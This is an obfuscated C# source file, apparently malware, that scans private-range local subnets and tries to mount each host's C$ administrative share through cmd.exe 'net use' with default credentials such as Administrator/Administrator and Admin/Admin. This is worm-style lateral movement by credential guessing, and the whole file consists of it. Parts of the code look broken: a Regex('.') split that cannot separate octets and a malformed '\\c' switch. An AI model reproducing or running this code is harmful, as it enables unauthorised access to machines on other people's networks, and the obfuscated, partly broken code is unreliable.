using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace OedchgEuvSrX;

internal class dhBbnpvdKpwTYK
{
	public static void qpNAvJKbcYovKCL()
	{
		List<GxPmQvxiuKaWzKL> list = GxPmQvxiuKaWzKL.ovuRjJUphuPTErU();
		foreach (GxPmQvxiuKaWzKL item in list)
		{
			try
			{
				if (item.RXAKbhnlOUHnX.StartsWith("10.") || item.RXAKbhnlOUHnX.StartsWith("172.16.") || item.RXAKbhnlOUHnX.StartsWith("192.168."))
				{
					FYbgMYhyLLz.VCcYLuTBMWd(item.hKKDBRnaSuqPfiM, item.RXAKbhnlOUHnX, "255.255.255.0");
				}
			}
			catch
			{
			}
		}
		foreach (GxPmQvxiuKaWzKL item2 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string qfBPlofKkoXr = regex.Split(item2.RXAKbhnlOUHnX)[0] + "." + regex.Split(item2.RXAKbhnlOUHnX)[1] + "." + regex.Split(item2.RXAKbhnlOUHnX)[2];
				List<string> list2 = rwLwFwapRqhgalZY.CmdQojtjQPY(qfBPlofKkoXr);
				foreach (string item3 in list2)
				{
					if (item2.RXAKbhnlOUHnX.StartsWith("10.") || item2.RXAKbhnlOUHnX.StartsWith("172.16.") || item2.RXAKbhnlOUHnX.StartsWith("192.168."))
					{
						RdLlDKYVGTt.mSZHpMYIEf("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Administrator Administrator");
						RdLlDKYVGTt.mSZHpMYIEf("cmd.exe", "\\c net use * \\\\" + item3 + "\\C$ /user:Admin Admin");
					}
				}
			}
			catch
			{
			}
		}
	}
}
